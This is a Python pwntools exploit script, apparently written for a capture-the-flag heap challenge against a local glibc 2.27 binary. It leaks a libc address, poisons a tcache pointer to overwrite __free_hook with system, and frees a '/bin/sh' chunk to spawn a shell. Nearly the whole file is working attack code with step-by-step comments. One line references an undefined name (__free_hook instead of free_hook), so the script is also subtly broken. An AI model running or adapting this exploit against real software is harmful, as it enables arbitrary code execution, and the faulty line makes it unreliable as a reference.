#!/usr/bin/env python3

from pwn import *

p = process("./out")
libc = ELF("./libc-2.27.so",  checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)
def add(index, size, data):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Enter the index:\n', str(index))
    p.sendlineafter('Enter the size:\n', str(size))
    p.sendlineafter('Enter data:\n', str(data))

def edit(index, data):
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Enter the index:\n', str(index))
    p.sendafter('Please update the data:\n', data)

def remove(index):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('Enter the index:\n', str(index))

def view(index):
    p.sendlineafter('>> ', '4')
    p.sendlineafter('Enter the index:\n', str(index))


def main():

    add(0,0x80,b"A"*8)
    add(1,0x80,b"B"*8)
    #puting a chunk in the unsorted bin so we leak libc
    for i in range(7):
        remove(1)
    remove(0)
    view(0)
    p.recvuntil(' :')
    base = u64(p.recv(6).ljust(8, b"\x00")) - 0x3ebca0
    free_hook = base + libc.sym['__free_hook']
    system = base + libc.sym['system']
    log.success("base = " + hex(base))
    log.success('free hook = ' + hex(free_hook))
    log.success('system = ' + hex(system))
    add(2,32,b"C"*8)
    add(3,32,b"D"*8)
    remove(2)
    remove(3)
    # TCACHE BIN of 32 is like : 3 -> 2 ( chunk 3 fd pointer point to chunk 2)
    edit(3, p64(__free_hook)) # fd poisining
    add(4, 32,b"/bin/sh\x00") # allocating a binsh string so we free it later on
    add(5, 32, b"E"*8) # 
    edit(5,p64(system)) # overwriting free_hook with system addr 
    remove(4) # triggering system("/bin/sh");
    p.interactive()


if __name__ == "__main__":
    main()
